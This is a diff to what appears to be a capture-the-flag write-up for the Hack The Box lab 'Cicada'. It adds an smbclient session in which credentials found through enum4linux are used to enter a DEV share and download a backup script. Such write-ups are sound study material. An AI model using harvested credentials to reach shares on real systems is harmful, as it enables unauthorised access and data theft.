@@ -528,3 +528,18 @@ enum4linux as user michael.wrightson output (found password for user david.oreli
   acb: '0x00020011'
   description: Key Distribution Center Service Account
 ```
+
+smbclient dev share output as user david.orelious:
+```bash
+└──╼ [★]$ smbclient -U david.orelious@cicada.htb \\\\cicada.htb\\DEV
+Password for [david.orelious@cicada.htb]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Mar 14 07:31:39 2024
+  ..                                  D        0  Thu Mar 14 07:21:29 2024
+  Backup_script.ps1                   A      601  Wed Aug 28 12:28:22 2024
+
+		4168447 blocks of size 4096. 432431 blocks available
+smb: \> get Backup_script.ps1
+getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
+```
